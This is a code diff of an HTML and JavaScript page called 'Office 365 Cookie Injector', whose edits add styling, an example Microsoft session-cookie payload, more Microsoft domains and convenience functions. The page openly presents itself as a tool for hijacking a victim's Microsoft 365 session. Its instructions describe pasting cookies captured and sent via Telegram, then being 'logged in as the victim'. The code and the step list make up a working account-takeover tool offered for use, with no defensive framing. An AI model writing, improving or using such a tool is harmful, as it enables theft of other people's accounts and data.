@@ -1,7 +1,8 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>🍪 Office 365 Cookie Injector</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -25,6 +26,15 @@
         }
         h1 { color: #ff6b00; margin-bottom: 10px; }
         .subtitle { color: #666; font-size: 14px; margin-bottom: 20px; }
+        .info-box {
+            background: #1a0a0a;
+            border: 1px solid #ff6b00;
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 20px;
+        }
+        .info-box h3 { color: #ff6b00; font-size: 14px; }
+        .info-box p { color: #888; font-size: 13px; margin-top: 5px; }
         textarea {
             width: 100%;
             height: 200px;
@@ -57,9 +67,13 @@
         }
         .btn:hover { transform: scale(1.02); }
         .btn.primary { background: #ff6b00; color: #000; }
+        .btn.primary:hover { background: #ff8833; }
         .btn.danger { background: #ff0040; color: #fff; }
+        .btn.danger:hover { background: #ff3366; }
         .btn.success { background: #00ff88; color: #000; }
+        .btn.success:hover { background: #33ff99; }
         .btn.secondary { background: #1a1a1a; color: #fff; border: 1px solid #333; }
+        .btn.secondary:hover { background: #2a2a2a; }
         #status {
             padding: 12px;
             border-radius: 8px;
@@ -77,6 +91,32 @@
             font-size: 13px;
         }
         .step .num { color: #ff6b00; font-weight: bold; }
+        .example {
+            background: #0a0a0a;
+            padding: 10px;
+            border-radius: 6px;
+            font-family: monospace;
+            font-size: 11px;
+            color: #00ff88;
+            margin: 5px 0;
+            border: 1px solid #1a1a1a;
+            word-break: break-all;
+            max-height: 200px;
+            overflow-y: auto;
+        }
+        .cookie-preview {
+            background: #0a0a0a;
+            padding: 10px;
+            border-radius: 6px;
+            font-family: monospace;
+            font-size: 11px;
+            color: #ffaa00;
+            margin: 10px 0;
+            border: 1px solid #1a1a1a;
+            word-break: break-all;
+            max-height: 150px;
+            overflow-y: auto;
+        }
     </style>
 </head>
 <body>
@@ -85,23 +125,61 @@
     <h1>🍪 Office 365 Cookie Injector</h1>
     <p class="subtitle">Paste captured cookies here to hijack the victim's session</p>
 
+    <div class="info-box">
+        <h3>⚠️ How This Works</h3>
+        <p>
+            1. Copy the cookies from your Telegram message<br>
+            2. Paste them below<br>
+            3. Click "Inject Cookies"<br>
+            4. Go to login.microsoftonline.com and refresh<br>
+            5. You'll be logged in as the victim!
+        </p>
+    </div>
+
     <div id="status"></div>
 
     <textarea id="cookieInput" placeholder='Paste your captured cookies here...'></textarea>
 
     <div class="btn-group">
         <button class="btn primary" onclick="injectCookies()">💉 Inject Cookies</button>
+        <button class="btn success" onclick="copyCookies()">📋 Copy from Input</button>
         <button class="btn danger" onclick="clearCookies()">🗑️ Clear All</button>
         <button class="btn secondary" onclick="goToMicrosoft()">🔗 Go to Microsoft</button>
     </div>
 
     <div style="margin-top: 20px; padding-top: 20px; border-top: 1px solid #1a1a1a;">
         <h3 style="color: #888; font-size: 13px; margin-bottom: 10px;">📋 Usage Steps</h3>
-        <div class="step"><span class="num">Step 1:</span> Get captured cookies from Telegram</div>
-        <div class="step"><span class="num">Step 2:</span> Paste the JSON data above</div>
-        <div class="step"><span class="num">Step 3:</span> Click "Inject Cookies"</div>
-        <div class="step"><span class="num">Step 4:</span> Go to login.microsoftonline.com</div>
-        <div class="step"><span class="num">Step 5:</span> ✅ You're logged in as the victim!</div>
+        <div class="step">
+            <span class="num">Step 1:</span>
+            <span class="text">Get captured cookies from your Telegram</span>
+        </div>
+        <div class="step">
+            <span class="num">Step 2:</span>
+            <span class="text">Paste the JSON data in the textarea above</span>
+        </div>
+        <div class="step">
+            <span class="num">Step 3:</span>
+            <span class="text">Click <strong style="color:#ff6b00;">"Inject Cookies"</strong></span>
+        </div>
+        <div class="step">
+            <span class="num">Step 4:</span>
+            <span class="text">Click <strong style="color:#0078d4;">"Go to Microsoft"</strong> or go to login.microsoftonline.com</span>
+        </div>
+        <div class="step">
+            <span class="num">Step 5:</span>
+            <span class="text" style="color:#00ff88;">✅ You're now logged in as the victim!</span>
+        </div>
+    </div>
+
+    <div style="margin-top: 20px; padding-top: 20px; border-top: 1px solid #1a1a1a;">
+        <h3 style="color: #888; font-size: 13px; margin-bottom: 10px;">📋 Example Cookie Format</h3>
+        <div class="example">
+{
+  "ESTSAUTHPERSISTENT": "1.ARwANrsQqYMdUEqqJZa2P-HM_ltEZUfGMrBJg-Ydk3ZSdsoAAI4cAA...",
+  "ESTSAUTH": "1.ARwANrsQqYMdUEqqJZa2P-HM_ltEZUfGMrBJg-Ydk3ZSdsoAAI4cAA.",
+  "ESTSAUTHLIGHT": "+005c0a9a-0832-0531-7b82-4640295ca3ea"
+}
+        </div>
     </div>
 </div>
 
@@ -115,6 +193,7 @@ function showStatus(message, type = 'info') {
 
 function injectCookies() {
     const input = document.getElementById('cookieInput').value.trim();
+    
     if (!input) {
         showStatus('❌ Error: Please paste cookies first!', 'error');
         return;
@@ -122,8 +201,21 @@ function injectCookies() {
     
     try {
         const cookies = JSON.parse(input);
+        
+        if (typeof cookies !== 'object' || Array.isArray(cookies)) {
+            showStatus('❌ Error: Invalid cookie format. Must be an object.', 'error');
+            return;
+        }
+        
         let count = 0;
-        const domains = ['.login.microsoftonline.com', '.microsoft.com', '.office.com'];
+        const domains = [
+            '.login.microsoftonline.com',
+            '.microsoft.com',
+            '.office.com',
+            '.office365.com',
+            '.microsoftonline.com',
+            '.live.com'
+        ];
         
         for (const [name, value] of Object.entries(cookies)) {
             if (name && value) {
@@ -136,6 +228,7 @@ function injectCookies() {
         }
         
         showStatus(`✅ Successfully injected ${count} cookies!`, 'success');
+        
         setTimeout(() => {
             if (confirm('✅ Cookies injected! Go to Microsoft 365 now?')) {
                 window.location.href = 'https://login.microsoftonline.com';
@@ -147,23 +240,48 @@ function injectCookies() {
     }
 }
 
+function copyCookies() {
+    const input = document.getElementById('cookieInput');
+    input.select();
+    document.execCommand('copy');
+    showStatus('📋 Copied to clipboard!', 'info');
+}
+
 function clearCookies() {
-    if (!confirm('⚠️ This will clear ALL cookies. Continue?')) return;
+    if (!confirm('⚠️ This will clear ALL cookies from your browser. Continue?')) {
+        return;
+    }
+    
     const cookies = document.cookie.split(';');
     let count = 0;
+    
     for (const cookie of cookies) {
         const [name] = cookie.trim().split('=');
         if (name) {
             document.cookie = `${name}=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/`;
+            document.cookie = `${name}=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/; domain=.login.microsoftonline.com`;
             count++;
         }
     }
+    
     showStatus(`🗑️ Cleared ${count} cookies`, 'info');
+    document.getElementById('cookieInput').value = '';
 }
 
 function goToMicrosoft() {
     window.open('https://login.microsoftonline.com', '_blank');
 }
+
+// Keyboard shortcuts
+document.addEventListener('keydown', function(e) {
+    if (e.key === 'Enter' && e.ctrlKey) {
+        e.preventDefault();
+        injectCookies();
+    }
+});
+
+showStatus('💡 Paste your captured cookies and click "Inject Cookies"', 'info');
+console.log('🍪 Cookie Injector ready');
 </script>
 
 </body>
